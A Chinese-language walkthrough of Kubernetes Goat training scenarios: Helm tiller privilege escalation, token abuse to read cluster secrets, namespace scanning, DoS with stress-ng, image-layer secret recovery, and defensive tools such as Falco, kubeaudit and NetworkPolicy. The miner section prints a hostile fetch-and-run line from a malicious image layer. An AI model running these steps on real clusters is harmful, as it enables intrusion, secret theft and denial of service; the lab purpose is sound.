实验环境：<https://katacoda.com/madhuakula/scenarios/kubernetes-goat>

#####  **0x9 Helm v2 tiller 风险（已弃用）**

> 此方案已被弃用，供学习参考，环境默认是 Helm v3版本，可以安装Helm v2版本来实验

`Helm`是`Kubernetes`的包管理器。这就像`ubuntu`的`apt-get`。在此场景中，利用较旧版本的`HELM`(版本2)，`tiller`服务 `RBAC`默认设置获取集群的访问权限。

    
    
    helm init --service-account=tiller --tiller-image=gcr.io/kubernetes-helm/tiller:v2.14.1   --history-max 300  
    ​

运行以下命令开启场景：

    
    
    kubectl run --rm --restart=Never -it --image=madhuakula/k8s-goat-helm-tiller -- bash

默认情况配置下，`Helm v2 Ttiller`部署具有完全群集管理员权限的`RBAC`。

默认安装在 `kube-system`命名空间中，服务名称为`tiller-deploy`，端口 `44134`暴露在
`0.0.0.0`。所以我们可以通过运行 `telnet`命令来验证。

![image-20220401171806154](https://image.3001.net/images/20220425/1650867026_62663b528910ee48bef56.png!small)

    
    
    telnet tiller-deploy.kube-system 44134

![image-20220401171835929](https://image.3001.net/images/20220425/1650867027_62663b536590eb4bb3ef4.png!small)

现在，我们可以连接到`tiller`服务端口了。我们可以使用 `helm`来执行操作并与 `tiller`服务通信。

![image-20220401172032128](https://image.3001.net/images/20220425/1650867028_62663b541fcbbef80ea75.png!small)

让我们试试是否可以从`Kube-System`命名空间获取集群中的`Kubernetes secrets`

![image-20220402105832760](https://image.3001.net/images/20220425/1650867028_62663b54e58c7e93f4ddd.png!small)

发现没有权限访问。

然后可以创建自己的 `helm chart`来授予默认服务帐户完全集群管理员访问权限，因为默认情况下，当前 `pod`部署在具有默认`service
account`的默认命名空间中。

    
    
    helm --host tiller-deploy.kube-system:44134 install --name pwnchart /pwnchart

![image-20220401172737067](https://image.3001.net/images/20220425/1650867029_62663b55b7948672d4821.png!small)

现在 pwnchart 已部署，它已授予所有默认服务帐户集群管理员访问权限。因此，让我们再次尝试获取 `kube-system namespace
secrets`

![image-20220402110024861](https://image.3001.net/images/20220425/1650867030_62663b56a96020536169c.png!small)

此场景会改变`Tiller`部署的执行方式，有时管理员会使用特定权限将`Tiller`部署到特定的名称空间。同样在`Helm
v3`中，也没有`tiller`服务来缓解此类漏洞。

参考资料：

<https://engineering.bitnami.com/articles/helm-security.html>

#####  **0x10 分析被部署挖矿软件的容器镜像**

针对基础设施的挖矿攻击越来越流行。尤其是像
`Kubernetes`这样的环境很容易成为目标，因为你甚至看不到容器镜像到底是基于什么构建的，以及它在主动监控方面做了什么。在此场景中，我们将分析和识别被植入挖矿软件的容器镜像。

首先，确定 `Kubernetes`集群中的所有资源/镜像和包括作业。

    
    
    controlplane $ kubectl get jobs  
    NAME               COMPLETIONS   DURATION   AGE  
    batch-check-job    1/1           6m32s      32m  
    hidden-in-layers   0/1

标识`Kubernetes`群集内的所有资源。尽可能详细了解集群内所有节点中可用的每个容器镜像的详细信息。

一旦我们确定了在`Kubernetes`集群中运行的作业，就可以通过运行以下命令来获取`Pod`信息。

    
    
    kubectl describe job batch-check-job

![image-20220329153905246](https://image.3001.net/images/20220425/1650867031_62663b57e0ff3fb7dab15.png!small)

获取`pods`信息：

    
    
    kubectl get pods --namespace default -l "job-name=batch-check-job"

![image-20220329154013352](https://image.3001.net/images/20220425/1650867032_62663b58b97cebd0dd02a.png!small)

获取`pod`信息`manifest`并分析：

    
    
    kubectl get pod batch-check-job-xxxx -o yaml

![image-20220329154147170](https://image.3001.net/images/20220425/1650867033_62663b5981f880de7b0db.png!small)

![image-20220329154440432](https://image.3001.net/images/20220425/1650867034_62663b5aa1272e67239c8.png!small)

可以看到`Docker`镜像名称是`madhuakula/k8s-goat-batch-check`

然后通过`docker history`查看镜像的构建历史记录：

    
    
    docker history --no-trunc madhuakula/k8s-goat-batch-check

![image-20220329154959332](https://image.3001.net/images/20220425/1650867035_62663b5bb8fa16b278fad.png!small)

我们发现它在其中一层的构建中植入了恶意挖矿脚本

    
    
    curl -sSL https://madhuakula.com/kubernetes-goat/k8s-goat-a5e0a28fa75bf429123943abedb065d1 && echo 'id' | sh " > /usr/bin/system-startup     && chmod +x /usr/bin/system-startup

#####  **0x11 绕过Kubernetes命名空间**

场景描述

默认情况下，`Kubernetes`使用平行网络架构，这意味着集群中的任何 `pod/service`都可以与其他
`pod/service`通信。默认情况下，集群内的命名空间没有任何网络安全限制。命名空间中的任何容器都可以与其他命名空间通信。我们听说
`Kubernetes-Goat`喜欢缓存。让我们看看我们是否可以访问其他命名空间。

首先运行以下命令，创建一个名为`hacker-container`的容器：

    
    
    kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh

收集集群`IP`信息：

    
    
    ip route  
    ip a show  
    printenv

![image-20220330124508928](https://image.3001.net/images/20220425/1650867036_62663b5cc7802ae33351c.png!small)

基于对系统的分析/理解，尝试使用`zmap`扫描集群内的`redis`服务信息：

    
    
    zmap -p 6379 10.0.0.0/8 -o results.csv

![image-20220330124658386](https://image.3001.net/images/20220425/1650867037_62663b5dd37dea9b91591.png!small)

查看结果：

![image-20220330135507655](https://image.3001.net/images/20220425/1650867038_62663b5ec52c37450e135.png!small)

> 还有另一种方法可以访问 Kubernetes 中的服务/pod。例如使用
> [DNS](https://kubernetes.io/docs/concepts/services-> networking/service/#dns)`cache-store-service.secure-> middleware`(servicename.namespace)。<https://kubernetes.io/docs/concepts/services-> networking/service/#dns>

使用`redis-cli`进行连接

![image-20220330135757210](https://image.3001.net/images/20220425/1650867039_62663b5f78ceac133aba1.png!small)

>
> 集群内还有许多其他的服务和资源，比如`ElasticSearch`，`Mongo`等等。所以，如果你的侦察技术很好，那么你可以在这里找到很多有价值的东西。

#####  **0x12 获取环境信息**

场景描述

`Kubernetes`中的每个环境都会有很多信息要共享。包括`Secrets`、`API Keys`、配置、服务等等关键内容。所以让我们继续收集关键信息！

访问`[http://127.0.0.1:1233](http://127.0.0.1:1233/)`

收集系统关键信息

    
    
    id  
    cat /proc/self/cgroup  
    cat /etc/hosts  
    mount  
    ls -la /home/

![image-20220330140750613](https://image.3001.net/images/20220425/1650867040_62663b6068d37fc618e54.png!small)

获取环境变量，包括 `Kubernetes Secret`的 `K8S_GOAT_VAULT_KEY=k8s-goat-cd2da27224591da2b48ef83826a8a6c3`和服务名称、端口等。

![image-20220330141200751](https://image.3001.net/images/20220425/1650867042_62663b625c2a9cee27d08.png!small)

#####  **0x13 针对环境的DoS风险**

场景描述

如果`Kubernetes`资源清单中没有规范，也没有为容器应用限制范围。作为攻击者，我们可以消耗
`pod/deployment`运行的所有资源，并饿死其他资源，从而对环境造成 `DoS`攻击。

本场景在[http://127.0.0.1:1236](http://127.0.0.1:1236/)中完成

此部署 `pod`未在 `Kubernetes`清单中设置任何资源限制。所以我们可以轻松执行一些列消耗资源的操作。

在这个 `pod`中，安装了一个名为 `stress-ng`的程序（压力测试工具）

执行之前查看资源情况：

    
    
    kubectl --namespace big-monolith top pod hunger-check-deployment-5d94d56fdb-hc2bv

![image-20220331123127374](https://image.3001.net/images/20220425/1650867043_62663b6350db194e4e321.png!small)

执行 `stress-ng`的程序

    
    
    stress-ng --vm 2 --vm-bytes 2G --timeout 30s

![image-20220331122244902](https://image.3001.net/images/20220425/1650867044_62663b6405d2f4f76cd1d.png!small)

再次查看资源情况：

![image-20220331123239292](https://image.3001.net/images/20220425/1650867044_62663b64b0e36f70377f7.png!small)

> 此攻击在某些情况下可能不起作用，如自动扩展、资源限制等情况

#####  **0x14 hacker-container 简介**

场景描述

这个场景只是对`Kubernetes`集群环境中的常见安全实用程序的探索。在之前你可能已经多次使用过`hacker-container`了。

运行：

    
    
    kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh

`Hacker Container`是一个实用工具，其中包含黑客入侵`Kubernetes`集群时可能会用的工具/命令列表。因此，你可以使用它对
`Kubernetes`环境进行自由探索。在这里，我们介绍一些强大的实用程序。

容器自检实用程序，用于获取系统功能的概述：

    
    
    amicontained

![image-20220331124353969](https://image.3001.net/images/20220425/1650867045_62663b656f48cb968236f.png!small)

针对内部服务执行 `Nikto`扫描

    
    
    nikto.pl -host http://metadata-db

![image-20220331124446880](https://image.3001.net/images/20220425/1650867046_62663b66664e5afaa0d1b.png!small)

还有许多其他程序。为了最大限度地利用`hacker-container`，我们可以使用主机特权、卷、进程等等。

#####  **0x15 Hidden in layers**

场景描述

敏感信息泄露是普遍存在的最常见漏洞之一。在容器化世界中，密码、私钥、令牌等很容易被错误处理。此场景下，我们将分析和识别导致敏感信息泄露等此类处理不当的不良做法之一。

执行以下命令，开始本次场景：

    
    
    kubectl get jobs

![image-20220331125137488](https://image.3001.net/images/20220425/1650867047_62663b67462d2d106fdd0.png!small)

尝试浏览运行容器中的所有文件、环境变量等。接下来，尝试用不同的工具分析上面使用的镜像，以找到暴露的敏感信息。

获取详细信息：

![image-20220331125704928](https://image.3001.net/images/20220425/1650867047_62663b67f2e6c5b39f936.png!small)

![image-20220331125731835](https://image.3001.net/images/20220425/1650867048_62663b68a73026c56cb7a.png!small)

使用`docker cli`分析镜像信息

    
    
    docker inspect madhuakula/k8s-goat-hidden-in-layers

![image-20220331125947437](https://image.3001.net/images/20220425/1650867049_62663b6986c494e2f6066.png!small)

可以看到镜像设置了容器启动时要执行的一些命令。但获取的信息还太少，继续探索。

如果我们了解这个镜像是如何从头开始构建的，也许对我们会更有帮助。如果你有 `dockerfile`，可以直接分析镜像的
`dockerfile`。如果没有，可以通过其他几种方法分析。

  * 方法一，查看构建历史
    
        docker history --no-trunc madhuakula/k8s-goat-hidden-in-layers

![image-20220331130434101](https://image.3001.net/images/20220425/1650867050_62663b6a98fc61a16edab.png!small)

可以看到在构建镜像的时候，添加了一个`secret.txt`的文件，可能是密钥之类的敏感文件。

  * 方法二，通过镜像反向生成dockerfile

可以通过`alpine/dfimage`工具生成指定镜像的`dockerfile`

    
        alias dfimage="docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage"  
    dfimage -sV=1.36 madhuakula/k8s-goat-hidden-in-layers

![image-20220331130815995](https://image.3001.net/images/20220425/1650867051_62663b6bbbb6812aa26d6.png!small)

  * 方法三，使用`Dive`工具

`Dive`是一个非常棒的工具，可以帮助分析镜像的每一层。<https://github.com/wagoodman/dive>

安装方式可以参考官方说明，使用方法如下

    
        dive madhuakula/k8s-goat-hidden-in-layers

![image-20220331131337382](https://image.3001.net/images/20220425/1650867053_62663b6d1374637aca4b5.png!small)

从以上分析中，我们可以看到`/root/contributions.txt`, `/root/secret.txt`这两个比较重要和可疑的文件。

接下来看看是否可以在运行的容器中找到这些文件。

![image-20220331132317529](https://image.3001.net/images/20220425/1650867053_62663b6df28a68560d366.png!small)

可以看到只有`contribution.txt`，而`secret.txt`，在构建的时候被删除了。我们现在想办法恢复它。

首先使用`docker save`把镜像导出为文件。

    
    
    docker save madhuakula/k8s-goat-hidden-in-layers -o hidden-in-layers.tar

解压出来：

    
    
    tar -xvf hidden-in-layers.tar

![image-20220331132838602](https://image.3001.net/images/20220425/1650867054_62663b6ee6684bd5aca9c.png!small)

我们可以看到每个层都被导出为一个单独的`tar`文件。这个镜像有3层，所以有3个`tar`文件。这里因为只有3层，所以很容易提取所有的层并检查内容，但如果镜像有上百层，这个方法就不太好用了。

根据之前`dive`的检查结果

![image-20220331133345023](https://image.3001.net/images/20220425/1650867056_62663b7011e81aad85ce2.png!small)

在`id`为`da73da4359e9edb793ee5472ae3538be8aec57c27efff7dae8873566c865533f`的这一层，添加了`secret.txt`文件，所以我们解压这一层的`tar`进行文件分析

![image-20220331133814688](https://image.3001.net/images/20220425/1650867057_62663b7134e3d0afae4db.png!small)

![image-20220331133837902](https://image.3001.net/images/20220425/1650867057_62663b71df0d624d9267d.png!small)

找到了关键信息。

 **参考：**

深入了解`docker`层：<https://jessicagreben.medium.com/digging-into-docker-layers-c22f948ed612>

#####  **0x16 RBAC最低权限配置错误**

场景描述

在现实世界中，们经常看到开发人员和
`devops`团队往往会提供超出需求的额外权限。这种情况发生时，攻击者获得了比他们预期的更多的控制权和特权。在此场景中，你可以利用绑定到 `pod`的
`serviceaccount`提供的 `webhookapikey`访问权限。但这也会让攻击者可以控制和获取敏感资源。获得对
`vaultapikey`的访问权限。

首先访问`[http://127.0.0.1:1236](http://127.0.0.1:1236/)`

![image-20220331135436032](https://image.3001.net/images/20220425/1650867058_62663b7289decf3ed68ec.png!small)

此部署具有映射了过度许可策略/访问权限的自定义服务帐户。作为攻击者，我们可以利用这一点来访问其他资源和服务。

由于`Kubernetes`默认情况下将所有`secrets`、`tokens`和`service accounts`信息都存储在一个固定的目录。

直接访问这个目录，查找敏感的信息：

    
    
    cd /var/run/secrets/kubernetes.io/serviceaccount/  
    ls -la

![image-20220331135819692](https://image.3001.net/images/20220425/1650867059_62663b735edb47936c85e.png!small)

现在我们可以使用这些信息与 `Kubernetes API`服务进行交互，该服务具有对令牌的可用权限和特权。

指向内部 API 服务器主机名：

    
    
    export APISERVER=https://${KUBERNETES_SERVICE_HOST}

设置 `ServiceAccount`令牌的路径

    
    
    export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount

读取 `pods namespace`并将其设置为变量。`namespace`应该是 `big-monolith`，如果它是`default`，你需要将
`Kubernetes-goat`更新到最新版本（<https://github.com/madhuakula/kubernetes-goat/commit/d068966ae481df55caed818c7cfc14867c1e42a1>）

    
    
    export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)

指定读取`ServiceAccount`持有者令牌

    
    
    export TOKEN=$(cat ${SERVICEACCOUNT}/token)

指定在`cURL`请求查询时要使用的证书路径

    
    
    export CACERT=${SERVICEACCOUNT}/ca.crt

然后就可以使用令牌和构造的查询来访问 `Kubernetes API`了

    
    
    curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api

![image-20220331143413299](https://image.3001.net/images/20220425/1650867060_62663b74810c13cc86390.png!small)

查询`default`命名空间中的`secrets`

    
    
    curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets

![image-20220331143521011](https://image.3001.net/images/20220425/1650867061_62663b75b8efa6ccc0eec.png!small)

查询特定命名空间的`secrets`

    
    
    curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets

![image-20220331144019449](https://image.3001.net/images/20220425/1650867062_62663b76a78f646b642ee.png!small)

查询特定命名空间中的`pod`

    
    
    curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/pods

![image-20220331144158593](https://image.3001.net/images/20220425/1650867063_62663b77b9c12a37dfb7a.png!small)

> 因为 `Kubernetes`本身是利用 `API`服务来创建、删除 `pod`等操作的，所以你可以尝试并利用所有可能的 `Kubernetes`操作。

获取 `k8svaultapikey`

    
    
    curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets | grep k8svaultapikey 

![image-20220331144406359](https://image.3001.net/images/20220425/1650867064_62663b78c2cf835845c8e.png!small)

解密看看:

    
    
    echo "azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=" | base64 -d

![image-20220331144536304](https://image.3001.net/images/20220425/1650867065_62663b79c044bac519a37.png!small)

#####  **0x17 利用KubeAudit 审计 Kubernetes 集群**

场景描述

本场景主要针对`Kubernetes`集群的各种不同安全问题进行审计。

要开始这个场景，你可以运行以下命令启动一个具有集群管理员权限的`hacker-container`(`tiller Service
Account`拥有集群管理员权限)

这一步可能需要先在`kubernetes`集群上为`Tiller`创建具有集群管理员权限的`Service Account`。

相关教程：<https://cloud.tencent.com/developer/article/1559675>

    
    
    kubectl run -n kube-system --serviceaccount=tiller --rm --restart=Never -it --image=madhuakula/hacker-container -- bash

![image-20220331151635057](https://image.3001.net/images/20220425/1650867066_62663b7a89737cabef6d2.png!small)

`kubeaudit`是一个命令行工具和一个 `Go`包，用于审计 `Kubernetes`集群各种不同的安全问题，例如：

  * run as non-root //非root运行

  * use a read-only root filesystem //使用只读文件系统

  * drop scary capabilities, don't add new ones //丢弃高危 capabilities，不添加新的

  * don't run privileged //不要以特权身份运行

  * and more! //等更多

有关该项目的更多详细信息，请参考 <https://github.com/Shopify/kubeaudit>

运行 `kubeaudit`。 `Kubeaudit`会检测它是否在集群中的容器内运行。如果是这样，它将尝试审计该集群中的所有
`Kubernetes`资源。

    
    
    kubeaudit all

![image-20220331152513407](https://image.3001.net/images/20220425/1650867067_62663b7b4e1349f14dc31.png!small)

![image-20220331152807143](https://image.3001.net/images/20220425/1650867068_62663b7c5f6d3469e47bd.png!small)

#####  **0x18 使用 Sysdig Falco 进行运行时安全监控和检测**

场景描述

这个场景是为容器和`Kubernetes`资源部署运行时安全监控和检测。

要开始使用此方案，你需要使用`helm v3`进行部署

    
    
    helm repo add falcosecurity https://falcosecurity.github.io/charts  
    helm repo update  
    helm install falco --set falco.jsonOutput=true  falcosecurity/falco

![image-20220331154313397](https://image.3001.net/images/20220425/1650867069_62663b7d38340498c3e94.png!small)

> 云原生运行时安全项目`Falco`是事实上的 Kubernetes 威胁检测引擎。 `Falco`由 `Sysdig`于 2016
> 年创建，是第一个作为孵化级项目加入 `CNCF`的运行时安全项目。 `Falco`可在运行时检测意外的应用程序行为并发出威胁警报。

`Falco`通过以下方式使用系统调用来保护和监控系统：

  * Parsing the Linux system calls from the kernel at runtime //在运行时从内核解析 Linux 系统调用

  * Asserting the stream against a powerful rules engine //强大的规则引擎断言流

  * Alerting when a rule is violated //在违反规则时发出警报

`Falco`附带了一组默认规则，用于检查内核的异常行为，例如：

  * Privilege escalation using privileged containers //使用特权容器提权

  * Namespace changes using tools like `setns`//使用 setns 等工具更改命名空间

  * Read/Writes to well-known directories such as /etc, /usr/bin, /usr/sbin, etc //对场景目录的读/写操作，如/etc、/usr/bin、/usr/sbin等

  * Creating symlinks //创建符号链接

  * Ownership and Mode changes //所有权和模式更改

  * Unexpected network connections or socket mutations //意外的网络连接或套接字突变

  * Spawned processes using execve //使用execve派生的进程

  * Executing shell binaries such as sh, bash, csh, zsh, etc //执行 shell 二进制文件，例如 sh、bash、csh、zsh 等

  * Executing SSH binaries such as ssh, scp, sftp, etc //执行 SSH 二进制文件，例如 ssh、scp、sftp 等

  * Mutating Linux coreutils executables //异常的Linux核心实用程序可执行文件

  * Mutating login binaries //异常的登录二进制文件

  * Mutating shadowutil or passwd executables such as shadowconfig, pwck, chpasswd, getpasswd, change, useradd, etc, and others. // 异常的shadowutil 或 passwd 可执行文件，例如 shadowconfig、pwck、chpasswd、getpasswd、change、useradd 等。

获取 `falco`部署的更多详细信息

![image-20220331155622149](https://image.3001.net/images/20220425/1650867070_62663b7e50a9a7b1dd354.png!small)

手动从`Falco`系统获取日志

    
    
    kubectl logs -f -l app=falco

![image-20220331155713860](https://image.3001.net/images/20220425/1650867071_62663b7f231774d4d4f4e.png!small)

现在，让我们启动一个`hacker container`并读取敏感文件，看看`Falco`是否能检测到

![image-20220331160112355](https://image.3001.net/images/20220425/1650867072_62663b8030f0c226100a4.png!small)

![image-20220401141027729](https://image.3001.net/images/20220425/1650867073_62663b8112640295c57ca.png!small)

#####  **0x19 使用Popeye发现Kubernetes集群潜在问题**

场景描述

此场景主要是通过实时扫描`Kubernetes`集群来审核`Kubernetes`集群，并上报部署的资源和配置的潜在问题。

要开始这个场景，运行以下命令启用具有集群管理员权限的`hacker container`

    
    
    kubectl run -n kube-system --serviceaccount=tiller --rm --restart=Never -it --image=madhuakula/hacker-container -- bash

`Popeye`是一种实用程序，可扫描实时
`Kubernetes`集群并报告已部署资源和配置的潜在问题。它根据部署的内容为集群消毒。通过扫描集群，它可以检测错误配置并帮助你确保最佳实践到位，从而防止未来出现问题。`Popeye`是一个只读工具，它不会以任何方式改变任何
`Kubernetes`资源。

以下是一些检查和扫描列表：

  * Node //节点

  * Namespace

  * Pod

  * Service

  * ServiceAccount

  * Secrets

  * ConfigMap

  * Deployment

  * StatefulSet

  * DaemonSet

  * PersistentVolume

  * PersistentVolumeClaim

  * HorizontalPodAutoscaler

  * PodDisruptionBudget

  * ClusterRole

  * ClusterRoleBinding

  * Role

  * RoleBinding

  * Ingress

  * NetworkPolicy

  * PodSecurityPolicy

有关该项目的更多详细信息，请参考 <https://github.com/derailed/popeye>

使用`cluster token`权限在集群中运行运行`popeye`

![image-20220401142701925](https://image.3001.net/images/20220425/1650867074_62663b82699a5e50ee966.png!small)

![image-20220401142722133](https://image.3001.net/images/20220425/1650867075_62663b836e0a4fa96232e.png!small)

![image-20220401142738904](https://image.3001.net/images/20220425/1650867076_62663b84888a48d72328c.png!small)

![image-20220401142815255](https://image.3001.net/images/20220425/1650867078_62663b860a2805b17ad74.png!small)

可以看到，集群健康评分为`83 B`

#####  **0x20 使用 NSP 保护网络边界**

场景描述

这个场景是为`Kubernetes`资源部署一个简单的网络安全策略来创建安全边界。

要开始此场景，请确保必须使用支持`NetworkPolicy`的网络解决方案。

场景提供来自：<https://github.com/ahmetb/kubernetes-network-policy-recipes>

如果你希望在`IP`地址或端口层面（`OSI`第 3 层或第 4 层）控制网络流量， 则你可以考虑为集群中特定应用使用
`Kubernetes`网络策略（`NetworkPolicy`）。

`NetworkPolicy`是一种以应用为中心的结构，允许你设置如何允许 `Pod`与网络上的各类网络“实体”
（我们这里使用实体以避免过度使用诸如“端点”和“服务”这类常用术语， 这些术语在 `Kubernetes`中有特定含义）通信。

Pod 可以通信的 `Pod`是通过如下三个标识符的组合来辩识的：

1、其他被允许的 `Pods`（例外：`Pod`无法阻塞对自身的访问）

2、被允许的名字空间

3、`IP`组块（例外：与 `Pod`运行所在的节点的通信总是被允许的， 无论 `Pod`或节点的 `IP`地址）

在定义基于 `Pod`或`namespace`的 `NetworkPolicy`时，你可以使用
`selector`来设定哪些流量可以进入或离开与该`selector`匹配的 `Pod`。

同时，当基于 `IP`的 `NetworkPolicy`被创建时，我们基于 `IP`组块（`CIDR`范围） 来定义策略。

创建一个拒绝所有去往应用流量的策略

> 此 `NetworkPolicy`会将所有去往被`Pod Selectors`选择的应用程序`pod`流量丢弃。

使用案例：

  * 这其实很常见：如果要使用白名单网络策略，首先需要使用此策略将流量列入黑名单

  * 你想运行一个 `Pod`并希望阻止任何其他 `Pod`与其通信

  * 你暂时希望将发往某个服务的流量与其他`Pod`隔离

![202204011510132.gif](https://image.3001.net/images/20220425/1650867078_62663b86f31af3a0ff847.gif!small)

 **示例**

运行一个`labels`为`app=web`的`Nginx pod`，并暴露`80`端口

    
    
    kubectl run --image=nginx web --labels app=web --expose --port 80

运行一个临时 `Pod`并向 `Web Service`发送请求

    
    
    kubectl run --rm -i -t --image=alpine test-$RANDOM -- sh

![image-20220401151749887](https://image.3001.net/images/20220425/1650867080_62663b881d5dec1338599.png!small)

可以看到能够正常访问，现在我们对集群应用下列网络策略

    
    
    kind: NetworkPolicy  
    apiVersion: networking.k8s.io/v1  
    metadata:  
    name: web-deny-all  
    spec:  
    podSelector:  
    matchLabels:  
    app: web  
    ingress: []

![image-20220401152000012](https://image.3001.net/images/20220425/1650867081_62663b891034733d1fc72.png!small)

再次尝试请求`Web Service`

![image-20220401160902584](https://image.3001.net/images/20220425/1650867081_62663b89bd16066af37f3.png!small)

流量被丢弃了

> Kuberneters Goat
> 提供的在线环境中，使用的是`flannel`网络解决方案，是不支持`NetworkPolicy`的。可以使用`Calico`网络解决方案。

说明：

  * 在上面的清单中，我们以带有 `app=web`标签的 `Pod`为目标来配置网络策略。此清单文件缺少 `spec.ingress`字段。因此它不允许任何流量进入 `Pod`。

  * 如果你创建另一个 `NetworkPolicy`让某些 `Pod`直接或间接访问此应用程序，则此 `NetworkPolicy`将失效。

  * 如果至少有一个 `NetworkPolicy`的规则允许流量，则意味着流量将被路由到 `Pod`，而不管阻止流量的策略如何。

删除策略

    
    
    kubectl -- delete -f web-deny-all.yaml

更多参考资料和资源可以在 <https://github.com/ahmetb/kubernetes-network-policy-recipes>找到

 **Cilium 编辑器 - 网络策略编辑器**

`Cilium`编辑器一个教你如何创建网络策略的工具/框架。它解释了基本的网络策略概念，并指导你完成实现所需的最低权限安全和零信任概念所需的步骤。

在线访问 `Cilium Editor`<https://editor.cilium.io/>

![image-20220401162436964](https://image.3001.net/images/20220425/1650867082_62663b8a9f1476dc2aa55.png!small)

 **参考资料：**

<https://kubernetes.io/docs/concepts/services-networking/network-policies/><https://github.com/ahmetb/kubernetes-network-policy-recipes><https://editor.cilium.io/>

##### 0x21 Kubernetes Goat的安全扫描报告

使用其他开源安全工具扫描`Kubernetes Goat`基础设施生成的安全扫描报告

  * Checkov：<https://github.com/bridgecrewio/checkov>
    
        git clone git@github.com:madhuakula/kubernetes-goat.git  
    checkov -d kubernetes-goat/

扫描报告了232个问题：

![image-20220401163135800](https://image.3001.net/images/20220425/1650867083_62663b8bf05aa0f087dad.png!small)

  * KICS：<https://kics.io/>`KICS`扫描报告了 265 个问题和`Kubernetes Goat`中的 `Docker`配置问题。

详细报告：<https://madhuakula.com/kubernetes-goat/reports/kics-output.html>

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

